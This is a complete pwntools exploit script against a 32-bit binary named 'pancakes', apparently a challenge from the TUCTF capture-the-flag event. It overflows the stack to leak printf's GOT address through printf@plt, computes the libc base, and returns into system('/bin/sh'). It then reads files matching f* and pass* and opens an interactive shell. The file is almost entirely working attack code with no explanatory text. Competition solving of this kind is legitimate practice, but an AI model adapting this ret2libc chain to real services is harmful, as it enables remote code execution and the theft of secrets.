from pwn import *

def exploit(p, libc, libc_diff):
    binary = ELF("pancakes")
    main = binary.symbols['main']
    printf_plt = binary.plt['printf']
    printf_got = binary.got['printf']
    padding = 44

    payload = ''
    payload += 'A' * padding
    payload += p32(printf_plt)
    payload += p32(main)
    payload += p32(printf_got)

    p.sendline(payload)
    p.recvuntil("Try harder\n")
    
    libc_leak = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc.address = libc_leak - libc_diff
    log.info("Libc base address : {}".format(hex(libc.address)))
    libc_system = libc.symbols['system']
    log.info("Libc system : {}".format(hex(libc_system)))
    libc_binsh = libc.search("/bin/sh").next()
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))

    payload = ''
    payload += 'A' * padding
    payload += p32(libc_system)
    payload += "JUNK"
    payload += p32(libc_binsh)

    p.sendline(payload)
    sleep(1)
    p.sendline("ls -la && cat f* && cat pass*")
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./pancakes")
        libc = ELF("libc6_2.27-3ubuntu1_i386.so")
        exploit(p, libc, 0x0512d0)
    elif sys.argv[1] == "remote":
        p = remote("chal.tuctf.com", 30503)
        libc = ELF("libc6_2.27-3ubuntu1_i386.so")
        exploit(p, libc, 0x0512d0)
    else:
        sys.exit(0)